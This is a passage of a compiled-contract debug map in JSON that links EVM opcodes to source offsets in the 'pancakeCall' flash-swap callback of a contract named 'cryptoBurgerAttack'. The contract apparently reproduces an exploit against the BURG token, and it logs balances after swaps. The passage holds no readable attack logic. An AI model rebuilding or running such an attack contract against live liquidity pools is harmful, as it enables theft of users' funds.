    "1555": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3443,
        3458
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1556": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1557": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1559": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "MUL",
      "path": "0"
    },
    "1560": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1562": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "ADD",
      "path": "0"
    },
    "1563": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "ADD",
      "path": "0"
    },
    "1564": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3443,
        3458
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1565": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3460,
        3461
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1567": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3479,
        3483
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "1568": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3422,
        3428
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2986"
    },
    "1571": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3422,
        3486
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1572": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3422,
        3486
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1573": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 11,
      "value": "0x40"
    },
    "1575": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1576": {
      "op": "PUSH4",
      "value": "0x7C0329D"
    },
    "1581": {
      "op": "PUSH1",
      "value": "0xE2"
    },
    "1583": {
      "op": "SHL"
    },
    "1584": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1585": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1586": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1588": {
      "op": "DUP1"
    },
    "1589": {
      "op": "MLOAD"
    },
    "1590": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1592": {
      "op": "PUSH2",
      "value": "0x2FBE"
    },
    "1595": {
      "op": "DUP4"
    },
    "1596": {
      "op": "CODECOPY"
    },
    "1597": {
      "op": "DUP2"
    },
    "1598": {
      "op": "MLOAD"
    },
    "1599": {
      "op": "SWAP2"
    },
    "1600": {
      "op": "MSTORE"
    },
    "1601": {
      "offset": [
        526,
        568
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1602": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3561
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x1F00CA74"
    },
    "1607": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3561
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1608": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x657"
    },
    "1611": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1612": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3575,
        3590
      ],
      "op": "DUP7",
      "path": "0"
    },
    "1613": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3575,
        3590
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1614": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3604,
        3608
      ],
      "op": "DUP7",
      "path": "0"
    },
    "1615": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3604,
        3608
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1616": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1618": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "ADD",
      "path": "0"
    },
    "1619": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2CED"
    },
    "1622": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3511,
        3618
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1623": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1624": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1626": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1628": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1629": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1630": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1631": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "SUB",
      "path": "0"
    },
    "1632": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1633": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP7",
      "path": "0"
    },
    "1634": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "GAS",
      "path": "0"
    },
    "1635": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "1636": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1637": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1638": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1639": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x674"
    },
    "1642": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1643": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1644": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1646": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1647": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1648": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1649": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1651": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1652": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1653": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "POP",
      "path": "0"
    },
    "1654": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "POP",
      "path": "0"
    },
    "1655": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "POP",
      "path": "0"
    },
    "1656": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "POP",
      "path": "0"
    },
    "1657": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1659": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1660": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1661": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1663": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1664": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1665": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
    "1667": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1668": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1669": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1670": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "ADD",
      "path": "0"
    },
    "1671": {
      "op": "PUSH1",
      "value": "0x1F"
    },
    "1673": {
      "op": "NOT"
    },
    "1674": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "AND",
      "path": "0"
    },
    "1675": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1676": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "ADD",
      "path": "0"
    },
    "1677": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1679": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1680": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x69C"
    },
    "1683": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1684": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1685": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1686": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "ADD",
      "path": "0"
    },
    "1687": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1688": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2D0E"
    },
    "1691": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3511,
        3618
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1692": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3511,
        3618
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1693": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3496,
        3618
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1694": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3496,
        3618
      ],
      "op": "POP",
      "path": "0"
    },
    "1695": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1697": {
      "op": "DUP1"
    },
    "1698": {
      "op": "MLOAD"
    },
    "1699": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1701": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "1704": {
      "op": "DUP4"
    },
    "1705": {
      "op": "CODECOPY"
    },
    "1706": {
      "op": "DUP2"
    },
    "1707": {
      "op": "MLOAD"
    },
    "1708": {
      "op": "SWAP2"
    },
    "1709": {
      "op": "MSTORE"
    },
    "1710": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3739
      ],
      "op": "DUP2",
      "path": "0",
      "statement": 12
    },
    "1711": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3740,
        3741
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1713": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1714": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1715": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1716": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "LT",
      "path": "0"
    },
    "1717": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6C0"
    },
    "1720": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1721": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x6C0"
    },
    "1724": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x2C93"
    },
    "1727": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "jump": "i",
      "offset": [
        3727,
        3742
      ],
      "op": "JUMP",
      "path": "0"
    },
    "1728": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1729": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1731": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "MUL",
      "path": "0"
    },
    "1732": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1734": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "ADD",
      "path": "0"
    },
    "1735": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "ADD",
      "path": "0"
    },
    "1736": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3727,
        3742
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1737": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1739": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1740": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x723"
    },
    "1743": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1744": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1745": {
      "op": "PUSH1",
      "value": "0x40"
    },
    "1747": {
      "op": "DUP1"
    },
    "1748": {
      "op": "DUP3"
    },
    "1749": {
      "op": "MSTORE"
    },
    "1750": {
      "op": "PUSH1",
      "value": "0x3C"
    },
    "1752": {
      "op": "SWAP1"
    },
    "1753": {
      "op": "DUP3"
    },
    "1754": {
      "op": "ADD"
    },
    "1755": {
      "op": "MSTORE"
    },
    "1756": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1758": {
      "op": "DUP1"
    },
    "1759": {
      "op": "MLOAD"
    },
    "1760": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1762": {
      "op": "PUSH2",
      "value": "0x2FDE"
    },
    "1765": {
      "op": "DUP4"
    },
    "1766": {
      "op": "CODECOPY"
    },
    "1767": {
      "op": "DUP2"
    },
    "1768": {
      "op": "MLOAD"
    },
    "1769": {
      "op": "SWAP2"
    },
    "1770": {
      "op": "MSTORE"
    },
    "1771": {
      "op": "PUSH1",
      "value": "0x60"
    },
    "1773": {
      "op": "DUP3"
    },
    "1774": {
      "op": "ADD"
    },
    "1775": {
      "op": "MSTORE"
    },
    "1776": {
      "op": "PUSH32",
      "value": "0x204255524720746F6B656E2061667465722031737420737761703A2000000000"
    },
    "1809": {
      "op": "PUSH1",
      "value": "0x80"
    },
    "1811": {
      "op": "DUP3"
    },
    "1812": {
      "op": "ADD"
    },
    "1813": {
      "op": "MSTORE"
    },
    "1814": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1816": {
      "op": "DUP2"
    },
    "1817": {
      "op": "ADD"
    },
    "1818": {
      "op": "SWAP2"
    },
    "1819": {
      "op": "SWAP1"
    },
    "1820": {
      "op": "SWAP2"
    },
    "1821": {
      "op": "MSTORE"
    },
    "1822": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1824": {
      "op": "ADD"
    },
    "1825": {
      "op": "SWAP1"
    },
    "1826": {
      "op": "JUMP"
    },
    "1827": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1828": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1830": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1831": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1832": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1833": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "SUB",
      "path": "0"
    },
    "1834": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1835": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3634,
        3752
      ],
      "op": "LOG1",
      "path": "0"
    },
    "1836": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3839
      ],
      "op": "PUSH1",
      "path": "0",
      "statement": 13,
      "value": "0x0"
    },
    "1838": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3839
      ],
      "op": "SLOAD",
      "path": "0"
    },
    "1839": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1841": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1842": {
      "op": "PUSH4",
      "value": "0x70A08231"
    },
    "1847": {
      "op": "PUSH1",
      "value": "0xE0"
    },
    "1849": {
      "op": "SHL"
    },
    "1850": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1851": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "MSTORE",
      "path": "0"
    },
    "1852": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3858,
        3862
      ],
      "op": "ADDRESS",
      "path": "0"
    },
    "1853": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x4"
    },
    "1855": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP3",
      "path": "0"
    },
    "1856": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "ADD",
      "path": "0"
    },
    "1857": {
      "op": "MSTORE"
    },
    "1858": {
      "op": "PUSH1",
      "value": "0x0"
    },
    "1860": {
      "op": "DUP1"
    },
    "1861": {
      "op": "MLOAD"
    },
    "1862": {
      "op": "PUSH1",
      "value": "0x20"
    },
    "1864": {
      "op": "PUSH2",
      "value": "0x2FFE"
    },
    "1867": {
      "op": "DUP4"
    },
    "1868": {
      "op": "CODECOPY"
    },
    "1869": {
      "op": "DUP2"
    },
    "1870": {
      "op": "MLOAD"
    },
    "1871": {
      "op": "SWAP2"
    },
    "1872": {
      "op": "MSTORE"
    },
    "1873": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3768,
        3874
      ],
      "op": "SWAP2",
      "path": "0"
    },
    "1874": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1876": {
      "op": "PUSH1",
      "value": "0x1"
    },
    "1878": {
      "op": "PUSH1",
      "value": "0xA0"
    },
    "1880": {
      "op": "SHL"
    },
    "1881": {
      "op": "SUB"
    },
    "1882": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3839
      ],
      "op": "AND",
      "path": "0"
    },
    "1883": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3839
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1884": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3849
      ],
      "op": "PUSH4",
      "path": "0",
      "value": "0x70A08231"
    },
    "1889": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3849
      ],
      "op": "SWAP1",
      "path": "0"
    },
    "1890": {
      "op": "PUSH1",
      "value": "0x24"
    },
    "1892": {
      "op": "ADD"
    },
    "1893": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x20"
    },
    "1895": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1897": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1898": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1899": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP4",
      "path": "0"
    },
    "1900": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "SUB",
      "path": "0"
    },
    "1901": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP2",
      "path": "0"
    },
    "1902": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP7",
      "path": "0"
    },
    "1903": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "GAS",
      "path": "0"
    },
    "1904": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "STATICCALL",
      "path": "0"
    },
    "1905": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1906": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1907": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "ISZERO",
      "path": "0"
    },
    "1908": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH2",
      "path": "0",
      "value": "0x781"
    },
    "1911": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "JUMPI",
      "path": "0"
    },
    "1912": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1913": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1915": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "DUP1",
      "path": "0"
    },
    "1916": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "RETURNDATACOPY",
      "path": "0"
    },
    "1917": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1918": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x0"
    },
    "1920": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "REVERT",
      "path": "0"
    },
    "1921": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "JUMPDEST",
      "path": "0"
    },
    "1922": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "POP",
      "path": "0"
    },
    "1923": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "POP",
      "path": "0"
    },
    "1924": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "POP",
      "path": "0"
    },
    "1925": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "POP",
      "path": "0"
    },
    "1926": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x40"
    },
    "1928": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "MLOAD",
      "path": "0"
    },
    "1929": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "RETURNDATASIZE",
      "path": "0"
    },
    "1930": {
      "fn": "cryptoBurgerAttack.pancakeCall",
      "offset": [
        3825,
        3864
      ],
      "op": "PUSH1",
      "path": "0",
      "value": "0x1F"
    },
